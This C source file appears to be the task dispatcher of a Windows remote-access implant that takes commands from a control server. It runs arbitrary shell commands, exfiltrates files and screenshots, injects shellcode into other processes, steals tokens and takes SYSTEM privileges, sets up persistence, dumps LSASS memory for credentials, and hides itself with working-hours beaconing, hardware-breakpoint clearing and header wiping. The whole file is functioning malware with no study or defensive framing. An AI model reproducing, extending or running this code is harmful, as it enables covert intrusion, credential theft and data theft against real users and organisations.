#include "commands.h"
#include "transport.h"
#include "config.h"
#include "evasion.h"
#include "b64.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include "api_resolve.h"

/* Runtime working-hours window ("HH:MM-HH:MM" or "" = always beacon) */
char g_working_hours[32] = {0};

// Dynamic sleep/jitter (updated by SLEEP command)
int g_sleep_sec  = AGENT_SLEEP_SEC;
int g_jitter_pct = AGENT_JITTER_PCT;

// ── Working hours ─────────────────────────────────────────────────────────────

int in_working_hours(void) {
    if (!g_working_hours[0]) return 1;  /* empty = always beacon */
    char *dash = strchr(g_working_hours, '-');
    if (!dash) return 1;
    int sh=0,sm=0,eh=0,em=0;
    sscanf(g_working_hours, "%d:%d", &sh, &sm);
    sscanf(dash+1, "%d:%d", &eh, &em);
    SYSTEMTIME st; GetLocalTime(&st);
    int cur = (int)st.wHour * 60 + (int)st.wMinute;
    int s = sh*60+sm, e = eh*60+em;
    if (s <= e) return cur >= s && cur < e;
    return cur >= s || cur < e;  /* overnight */
}

void sleep_until_work_hours(void) {
    if (!g_working_hours[0]) return;
    char *dash = strchr(g_working_hours, '-');
    if (!dash) return;
    int sh=0,sm=0;
    sscanf(g_working_hours, "%d:%d", &sh, &sm);
    SYSTEMTIME st; GetLocalTime(&st);
    int cur = (int)st.wHour * 60 + (int)st.wMinute;
    int s = sh*60+sm;
    int wait_min = (cur < s) ? s - cur : (24*60 - cur) + s;
    if (wait_min > 0) sleep_masked((DWORD)wait_min * 60 * 1000);
}

// ── Shell execution ───────────────────────────────────────────────────────────

static char* run_shell(const char *cmd) {
    // Use _popen to capture stdout+stderr
    char full_cmd[4096];
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /s /c \"%s\" 2>&1", cmd);

    FILE *f = _popen(full_cmd, "r");
    if (!f) return strdup("[error: popen failed]");

    size_t cap = 4096, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { _pclose(f); return strdup("[error: oom]"); }

    int c;
    while ((c = fgetc(f)) != EOF) {
        if (len + 2 >= cap) {
            cap *= 2;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        buf[len++] = (char)c;
    }
    buf[len] = '\0';
    _pclose(f);
    return buf;
}

// ── Directory listing ─────────────────────────────────────────────────────────

static char* do_ls(const char *path) {
    char pattern[MAX_PATH];
    if (!path || !path[0]) {
        GetCurrentDirectoryA(sizeof(pattern), pattern);
        strncat(pattern, "\\*", sizeof(pattern) - strlen(pattern) - 1);
    } else {
        snprintf(pattern, sizeof(pattern), "%s\\*", path);
    }

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return strdup("[error listing]");

    size_t cap = 4096, len = 0;
    char *buf = (char*)malloc(cap);
    if (!buf) { FindClose(h); return strdup("[oom]"); }
    buf[0] = '\0';

    do {
        char line[MAX_PATH + 4];
        const char *kind = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "D" : "F";
        // Build full path for display
        char dir[MAX_PATH];
        if (!path || !path[0]) GetCurrentDirectoryA(sizeof(dir), dir);
        else strncpy(dir, path, sizeof(dir) - 1);
        snprintf(line, sizeof(line), "%s  %s\\%s\n", kind, dir, fd.cFileName);

        size_t ll = strlen(line);
        if (len + ll + 2 >= cap) {
            cap = len + ll + 4096;
            char *nb = (char*)realloc(buf, cap);
            if (!nb) break;
            buf = nb;
        }
        strncat(buf + len, line, cap - len - 1);
        len += ll;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return buf;
}

// ── Sysinfo ───────────────────────────────────────────────────────────────────

static char* do_sysinfo(void) {
    char hostname[128] = "UNKNOWN", username[128] = "UNKNOWN";
    DWORD h_sz = sizeof(hostname), u_sz = sizeof(username);
    GetComputerNameA(hostname, &h_sz);
    GetUserNameA(username, &u_sz);
    char *buf = (char*)malloc(512);
    if (!buf) return strdup("oom");
    snprintf(buf, 512,
        "hostname=%s\nusername=%s\nos=windows/amd64\npid=%lu",
        hostname, username, (unsigned long)GetCurrentProcessId());
    return buf;
}

// ── Jitter sleep ──────────────────────────────────────────────────────────────

unsigned long sleep_ms_jitter(void) {
    unsigned long base = (unsigned long)g_sleep_sec * 1000;
    if (g_jitter_pct <= 0) return base;
    unsigned long jit = base * g_jitter_pct / 100;
    unsigned long r;
    BCryptGenRandom(NULL, (PUCHAR)&r, sizeof(r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    long long delta = (long long)(r % (jit * 2 + 1)) - (long long)jit;
    long long ms = (long long)base + delta;
    if (ms < 1000) ms = 1000;
    return (unsigned long)ms;
}

// ── JSON helpers ─────────────────────────────────────────────────────────────

static int json_get_int(const char *json, const char *key, int def) {
    char pat[128]; snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat); if (!p) return def;
    p = strchr(p, ':'); if (!p) return def;
    int v; return sscanf(p+1, " %d", &v) == 1 ? v : def;
}

static void json_get_str(const char *json, const char *key, char *out, size_t out_sz, const char *def) {
    char pat[128]; snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) { strncpy(out, def, out_sz-1); out[out_sz-1]='\0'; return; }
    p = strchr(p + strlen(pat), '"');
    if (!p) { strncpy(out, def, out_sz-1); out[out_sz-1]='\0'; return; }
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz-1) out[i++] = *p++;
    out[i] = '\0';
}

// ── Process injection ─────────────────────────────────────────────────────────

static char *inject_remote(int pid, const uint8_t *sc, size_t sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"VirtualAllocEx failed %lu",GetLastError()); return e; }
    SIZE_T written = 0;
    WriteProcessMemory(hProc, mem, sc, sc_len, &written);
    DWORD old; VirtualProtectEx(hProc, mem, sc_len, PAGE_EXECUTE_READ, &old);
    DWORD tid = 0;
    HANDLE ht = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &tid);
    if (!ht) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"CreateRemoteThread failed %lu",GetLastError()); return e; }
    CloseHandle(ht); CloseHandle(hProc);
    char *out = (char*)malloc(128);
    snprintf(out, 128, "[+] injected %zu bytes into PID %d (TID=%lu)", sc_len, pid, (unsigned long)tid);
    return out;
}

static char *inject_apc(int pid, const uint8_t *sc, size_t sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed %lu",GetLastError()); return e; }
    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"VirtualAllocEx failed %lu",GetLastError()); return e; }
    SIZE_T written = 0;
    WriteProcessMemory(hProc, mem, sc, sc_len, &written);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return strdup("snapshot failed"); }
    THREADENTRY32 te; te.dwSize = sizeof(te);
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if ((int)te.th32OwnerProcessID == pid) {
                HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (ht) { QueueUserAPC((PAPCFUNC)mem, ht, 0); CloseHandle(ht); queued++; }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); CloseHandle(hProc);
    char *out = (char*)malloc(64);
    snprintf(out, 64, "[+] APC queued to %d thread(s) in PID %d", queued, pid);
    return out;
}

// ── Token operations ──────────────────────────────────────────────────────────

static int enable_privilege(HANDLE hToken, const char *priv_name) {
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, priv_name, &luid)) return 0;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) ? 1 : 0;
}

static char *token_steal(int pid) {
    HANDLE hSelf;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hSelf)) {
        enable_privilege(hSelf, "SeDebugPrivilege"); CloseHandle(hSelf);
    }
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
    HANDLE hTok;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE|TOKEN_QUERY, &hTok)) {
        CloseHandle(hProc);
        char *e=(char*)malloc(64); snprintf(e,64,"OpenProcessToken failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hProc);
    HANDLE hDup;
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hTok);
        char *e=(char*)malloc(64); snprintf(e,64,"DuplicateTokenEx failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hTok);
    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup);
        char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hDup);
    char *out=(char*)malloc(64); snprintf(out,64,"[+] impersonating token from PID %d",pid); return out;
}

static char *token_make(const char *user, const char *domain, const char *pass) {
    WCHAR wu[256], wd[256], wp[256];
    MultiByteToWideChar(CP_UTF8,0,user,-1,wu,256);
    MultiByteToWideChar(CP_UTF8,0,domain,-1,wd,256);
    MultiByteToWideChar(CP_UTF8,0,pass,-1,wp,256);
    HANDLE hTok;
    if (!LogonUserW(wu, wd, wp, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hTok)) {
        char *e=(char*)malloc(64); snprintf(e,64,"LogonUser failed (err %lu)",GetLastError()); return e;
    }
    if (!ImpersonateLoggedOnUser(hTok)) {
        CloseHandle(hTok);
        char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed (err %lu)",GetLastError()); return e;
    }
    CloseHandle(hTok);
    char *out=(char*)malloc(256); snprintf(out,256,"[+] impersonating %s\\%s",domain,user); return out;
}

static char *get_system(void) {
    HANDLE hSelf;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hSelf)) {
        enable_privilege(hSelf, "SeDebugPrivilege"); CloseHandle(hSelf);
    }
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return strdup("CreateToolhelp32Snapshot failed");
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    DWORD sysPid = 0;
    if (Process32First(snap, &pe)) {
        do { if (_stricmp(pe.szExeFile, "winlogon.exe") == 0) { sysPid = pe.th32ProcessID; break; } }
        while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    if (!sysPid) return strdup("winlogon.exe not found");
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sysPid);
    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed %lu",GetLastError()); return e; }
    HANDLE hTok;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok)) {
        CloseHandle(hProc);
        char *e=(char*)malloc(64); snprintf(e,64,"OpenProcessToken failed %lu",GetLastError()); return e;
    }
    CloseHandle(hProc);
    HANDLE hDup;
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hTok);
        char *e=(char*)malloc(64); snprintf(e,64,"DuplicateTokenEx failed %lu",GetLastError()); return e;
    }
    CloseHandle(hTok);
    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup);
        char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed %lu",GetLastError()); return e;
    }
    CloseHandle(hDup);
    char *out=(char*)malloc(128); snprintf(out,128,"[+] SYSTEM token (winlogon PID=%lu)",(unsigned long)sysPid); return out;
}

// ── Dispatcher ────────────────────────────────────────────────────────────────

void dispatch_task(AgentTask *task) {
    const char *args = task->args ? task->args : "";
    char type_upper[64];
    strncpy(type_upper, task->type, sizeof(type_upper) - 1);
    for (int i = 0; type_upper[i]; i++) type_upper[i] = (char)toupper((unsigned char)type_upper[i]);

    if (strcmp(type_upper, "SHELL") == 0) {
        char *out = run_shell(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "SLEEP") == 0) {
        int sec = -1, jit = -1;
        sscanf(args, "%d %d", &sec, &jit);
        if (sec >= 0) g_sleep_sec  = sec;
        if (jit >= 0) g_jitter_pct = jit;
        agent_send_result(task->id, "[+] sleep updated", "");
    }
    else if (strcmp(type_upper, "SYSINFO") == 0) {
        char *out = do_sysinfo();
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "PS") == 0) {
        char *out = run_shell("tasklist /FO CSV /NH 2>&1");
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "PWD") == 0) {
        char cwd[MAX_PATH] = {0};
        GetCurrentDirectoryA(sizeof(cwd), cwd);
        agent_send_result(task->id, cwd, "");
    }
    else if (strcmp(type_upper, "CD") == 0) {
        if (SetCurrentDirectoryA(args)) {
            char cwd[MAX_PATH] = {0};
            GetCurrentDirectoryA(sizeof(cwd), cwd);
            agent_send_result(task->id, cwd, "");
        } else {
            char err[64];
            snprintf(err, sizeof(err), "cd: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "LS") == 0) {
        char *out = do_ls(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "PPID") == 0) {
        /* args JSON: {"cmd":"notepad.exe","parent":"explorer.exe"} */
        char cmd[512] = {0}, parent[128] = "explorer.exe";
        const char *p = strstr(args, "\"cmd\"");
        if (p) { p = strchr(p+5,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<511) cmd[i++]=*p++; cmd[i]='\0'; } }
        p = strstr(args, "\"parent\"");
        if (p) { p = strchr(p+8,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<127) parent[i++]=*p++; parent[i]='\0'; } }
        if (!cmd[0]) strncpy(cmd, "cmd.exe", sizeof(cmd)-1);
        if (spawn_with_ppid(cmd, parent)) agent_send_result(task->id, "[+] spawned", "");
        else { char err[128]; snprintf(err,sizeof(err),"ppid: failed (err %lu)",GetLastError()); agent_send_result(task->id,"",err); }
    }
    else if (strcmp(type_upper, "CONFIG") == 0) {
        /* args JSON: {"sleep_sec":N,"jitter_pct":N,"working_hours":"HH:MM-HH:MM"} */
        int new_sec = -1, new_jit = -1;
        const char *p = strstr(args, "\"sleep_sec\"");
        if (p) { p = strchr(p+11,':'); if(p) sscanf(p+1," %d",&new_sec); }
        p = strstr(args, "\"jitter_pct\"");
        if (p) { p = strchr(p+12,':'); if(p) sscanf(p+1," %d",&new_jit); }
        p = strstr(args, "\"working_hours\"");
        if (p) { p = strchr(p+15,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<31) g_working_hours[i++]=*p++; g_working_hours[i]='\0'; } }
        if (new_sec >= 0) g_sleep_sec  = new_sec;
        if (new_jit >= 0) g_jitter_pct = new_jit;
        agent_send_result(task->id, "[+] config updated", "");
    }
    else if (strcmp(type_upper, "KILL") == 0) {
        agent_send_result(task->id, "bye", "");
        ExitProcess(0);
    }
    else if (strcmp(type_upper, "CAT") == 0) {
        HANDLE hf = CreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[64];
            snprintf(err, sizeof(err), "open: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        } else {
            DWORD fsz = GetFileSize(hf, NULL);
            char *buf = (char*)malloc(fsz + 1);
            DWORD rd = 0;
            ReadFile(hf, buf, fsz, &rd, NULL);
            CloseHandle(hf);
            buf[rd] = '\0';
            agent_send_result(task->id, buf, "");
            free(buf);
        }
    }
    else if (strcmp(type_upper, "MKDIR") == 0) {
        if (CreateDirectoryA(args, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
            agent_send_result(task->id, "[+] created", "");
        else {
            char err[64]; snprintf(err, sizeof(err), "mkdir: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "RM") == 0) {
        DWORD attr = GetFileAttributesA(args);
        int r;
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
            r = RemoveDirectoryA(args);
        else
            r = DeleteFileA(args);
        if (r) agent_send_result(task->id, "[+] removed", "");
        else {
            char err[64]; snprintf(err, sizeof(err), "rm: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "UPLOAD") == 0) {
        // args = JSON {"filename":"...","remote_path":"..."}
        char filename[256] = {0}, remote_path[MAX_PATH] = {0};
        // minimal JSON extraction
        const char *p = strstr(args, "\"filename\"");
        if (p) {
            p = strchr(p + 10, '"'); if (p) { p++;
            size_t i = 0;
            while (*p && *p != '"' && i < sizeof(filename)-1) filename[i++] = *p++;
            filename[i] = '\0'; }
        }
        p = strstr(args, "\"remote_path\"");
        if (p) {
            p = strchr(p + 13, '"'); if (p) { p++;
            size_t i = 0;
            while (*p && *p != '"' && i < sizeof(remote_path)-1) remote_path[i++] = *p++;
            remote_path[i] = '\0'; }
        }
        if (!filename[0] || !remote_path[0]) {
            agent_send_result(task->id, "", "upload: missing fields"); return;
        }
        size_t data_len = 0;
        uint8_t *data = agent_download_file(filename, &data_len);
        if (!data) { agent_send_result(task->id, "", "download from server failed"); return; }
        HANDLE hf = CreateFileA(remote_path, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            free(data);
            char err[64]; snprintf(err, sizeof(err), "write: error %lu", GetLastError());
            agent_send_result(task->id, "", err); return;
        }
        DWORD wr = 0;
        WriteFile(hf, data, (DWORD)data_len, &wr, NULL);
        CloseHandle(hf);
        free(data);
        char msg[256];
        snprintf(msg, sizeof(msg), "written %zu bytes to %s", data_len, remote_path);
        agent_send_result(task->id, msg, "");
    }
    else if (strcmp(type_upper, "DOWNLOAD") == 0) {
        HANDLE hf = CreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[64]; snprintf(err, sizeof(err), "read: error %lu", GetLastError());
            agent_send_result(task->id, "", err); return;
        }
        DWORD fsz = GetFileSize(hf, NULL);
        uint8_t *buf = (uint8_t*)malloc(fsz);
        DWORD rd = 0;
        ReadFile(hf, buf, fsz, &rd, NULL);
        CloseHandle(hf);
        const char *name = strrchr(args, '\\');
        name = name ? name + 1 : args;
        agent_upload_file(task->id, name, buf, rd);
        free(buf);
        char msg[128];
        snprintf(msg, sizeof(msg), "uploaded %lu bytes", rd);
        agent_send_result(task->id, msg, "");
    }
    else if (strcmp(type_upper, "SCREENSHOT") == 0) {
        char *out = run_shell("powershell.exe -NoP -NonI -W Hidden -C \""
            "Add-Type -Assembly System.Windows.Forms,System.Drawing;"
            "$b=[Drawing.Bitmap]::new([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
            "[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
            "$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$b.Size);"
            "$ms=[IO.MemoryStream]::new();$b.Save($ms,'Png');"
            "$path='C:\\\\Windows\\\\Temp\\\\_sc.png';$b.Save($path);"
            "Write-Output $path\"");
        /* upload the saved file */
        if (out && out[0]) {
            char fpath[MAX_PATH] = {0};
            sscanf(out, " %259s", fpath);
            free(out);
            HANDLE hf = CreateFileA(fpath, GENERIC_READ, FILE_SHARE_READ, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                DWORD fsz = GetFileSize(hf, NULL);
                uint8_t *data = (uint8_t*)malloc(fsz);
                DWORD rd = 0; ReadFile(hf, data, fsz, &rd, NULL); CloseHandle(hf);
                agent_upload_file(task->id, "screenshot.png", data, rd);
                free(data); DeleteFileA(fpath);
                char m[64]; snprintf(m, 64, "[+] screenshot (%lu bytes)", rd);
                agent_send_result(task->id, m, "");
            } else agent_send_result(task->id, "", "screenshot: file save failed");
        } else { free(out); agent_send_result(task->id, "", "screenshot: powershell failed"); }
    }
    else if (strcmp(type_upper, "INJECT_REMOTE") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "INJECT_REMOTE: no shellcode payload"); return;
        }
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "INJECT_REMOTE requires {\"pid\":N}"); return; }
        char *out = inject_remote(pid, task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "INJECT_APC") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "INJECT_APC: no shellcode payload"); return;
        }
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "INJECT_APC requires {\"pid\":N}"); return; }
        char *out = inject_apc(pid, task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "TOKEN_STEAL") == 0) {
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "TOKEN_STEAL requires {\"pid\":N}"); return; }
        char *out = token_steal(pid);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "TOKEN_MAKE") == 0) {
        char user[128]={0}, domain[128]={0}, pass[128]={0};
        json_get_str(args,"user",user,sizeof(user),"");
        json_get_str(args,"domain",domain,sizeof(domain),".");
        json_get_str(args,"pass",pass,sizeof(pass),"");
        if (!user[0] || !pass[0]) { agent_send_result(task->id,"","TOKEN_MAKE requires user+pass"); return; }
        char *out = token_make(user, domain, pass);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "TOKEN_DROP") == 0) {
        RevertToSelf();
        agent_send_result(task->id, "[+] reverted to original token", "");
    }
    else if (strcmp(type_upper, "TOKEN_WHOAMI") == 0) {
        char buf[256]={0}; DWORD sz=sizeof(buf);
        GetUserNameA(buf, &sz);
        agent_send_result(task->id, buf, "");
    }
    else if (strcmp(type_upper, "GETSYSTEM") == 0) {
        char *out = get_system();
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "PERSIST") == 0) {
        char name[128]={0}, cmd2[512]={0}, meth[32]={0};
        json_get_str(args,"name",name,sizeof(name),"Updater");
        json_get_str(args,"cmd",cmd2,sizeof(cmd2),"");
        json_get_str(args,"method",meth,sizeof(meth),"registry");
        if (!cmd2[0]) { agent_send_result(task->id,"","PERSIST requires cmd"); return; }
        char shell_cmd[1024]={0};
        if (strcmp(meth,"schtask")==0)
            snprintf(shell_cmd,sizeof(shell_cmd),"schtasks /create /tn \"%s\" /tr \"%s\" /sc ONLOGON /ru SYSTEM /f 2>&1",name,cmd2);
        else
            snprintf(shell_cmd,sizeof(shell_cmd),"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"%s\" /t REG_SZ /d \"%s\" /f 2>&1",name,cmd2);
        char *out = run_shell(shell_cmd);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "PERSIST_RM") == 0) {
        char name[128]={0}, meth[32]={0};
        json_get_str(args,"name",name,sizeof(name),"");
        json_get_str(args,"method",meth,sizeof(meth),"registry");
        if (!name[0]) { agent_send_result(task->id,"","PERSIST_RM requires name"); return; }
        char shell_cmd[512]={0};
        if (strcmp(meth,"schtask")==0)
            snprintf(shell_cmd,sizeof(shell_cmd),"schtasks /delete /tn \"%s\" /f 2>&1",name);
        else
            snprintf(shell_cmd,sizeof(shell_cmd),"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"%s\" /f 2>&1",name);
        char *out = run_shell(shell_cmd);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_QUERY") == 0) {
        char cmd2[512]; snprintf(cmd2,sizeof(cmd2),"reg query \"%s\" 2>&1",args);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_LIST") == 0) {
        char cmd2[512]; snprintf(cmd2,sizeof(cmd2),"reg query \"%s\" /s 2>&1",args);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_SET") == 0) {
        char path[256]={0}, name[128]={0}, typ2[32]={0}, val[512]={0};
        json_get_str(args,"path",path,sizeof(path),"");
        json_get_str(args,"name",name,sizeof(name),"");
        json_get_str(args,"type",typ2,sizeof(typ2),"REG_SZ");
        json_get_str(args,"value",val,sizeof(val),"");
        char cmd2[1024]; snprintf(cmd2,sizeof(cmd2),"reg add \"%s\" /v \"%s\" /t %s /d \"%s\" /f 2>&1",path,name,typ2,val);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_DELETE") == 0) {
        char path[256]={0}, name[128]={0};
        json_get_str(args,"path",path,sizeof(path),"");
        json_get_str(args,"name",name,sizeof(name),"");
        char cmd2[512];
        if (name[0])
            snprintf(cmd2,sizeof(cmd2),"reg delete \"%s\" /v \"%s\" /f 2>&1",path,name);
        else
            snprintf(cmd2,sizeof(cmd2),"reg delete \"%s\" /f 2>&1",path);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "PORT_SCAN") == 0) {
        char host[128]={0}, ports[256]={0};
        json_get_str(args,"host",host,sizeof(host),"127.0.0.1");
        json_get_str(args,"ports",ports,sizeof(ports),"80,443,445,3389,22,21,8080");
        int timeout = json_get_int(args,"timeout",500);
        char ps[1024];
        snprintf(ps,sizeof(ps),
            "powershell.exe -NoP -NonI -W Hidden -C \"$h='%s';$t=%d;"
            "'%s'.Split(',') | ForEach-Object { $p=[int]$_;"
            "$s=New-Object System.Net.Sockets.TcpClient;"
            "$a=$s.BeginConnect($h,$p,$null,$null);"
            "if($a.AsyncWaitHandle.WaitOne($t)){if($s.Connected){'OPEN '+$h+':'+$p};$s.Close()} }\"",
            host, timeout, ports);
        char *out = run_shell(ps); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "MINIDUMP") == 0) {
        char path[MAX_PATH]={0};
        json_get_str(args,"path",path,sizeof(path),"C:\\Windows\\Temp\\1.dmp");
        char ps[512];
        snprintf(ps,sizeof(ps),
            "powershell.exe -NoP -NonI -C \"$p=(Get-Process lsass).Id;"
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump $p '%s' full\"",
            path);
        char *out = run_shell(ps);
        if (!out || !out[0]) {
            free(out); char m[256]; snprintf(m,sizeof(m),"[+] dump written to %s",path);
            agent_send_result(task->id, m, "");
        } else { agent_send_result(task->id, out, ""); free(out); }
    }
    else if (strcmp(type_upper, "ENV") == 0) {
        char *out = run_shell("set 2>&1"); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "HWBP_CLEAR") == 0) {
        HANDLE ht = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, GetCurrentThreadId());
        if (!ht) {
            char e[64]; snprintf(e,sizeof(e),"OpenThread failed (err %lu)",(DWORD)GetLastError());
            agent_send_result(task->id, "", e);
        } else {
            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (GetThreadContext(ht, &ctx)) {
                ctx.Dr0=0; ctx.Dr1=0; ctx.Dr2=0; ctx.Dr3=0;
                ctx.Dr6=0; ctx.Dr7=0;
                SetThreadContext(ht, &ctx);
            }
            CloseHandle(ht);
            agent_send_result(task->id, "[+] hardware breakpoints cleared", "");
        }
    }
    else if (strcmp(type_upper, "WIPE_MZ") == 0) {
        HMODULE base = GetModuleHandleW(NULL);
        if (!base) {
            agent_send_result(task->id, "", "GetModuleHandleW failed");
        } else {
            DWORD old=0;
            VirtualProtect((LPVOID)base, 2, PAGE_READWRITE, &old);
            *(BYTE*)base = 0;
            *((BYTE*)base+1) = 0;
            VirtualProtect((LPVOID)base, 2, old, &old);
            agent_send_result(task->id, "[+] MZ header wiped", "");
        }
    }
    else {
        char err[128];
        snprintf(err, sizeof(err), "unknown task type: %s", task->type);
        agent_send_result(task->id, "", err);
    }
}
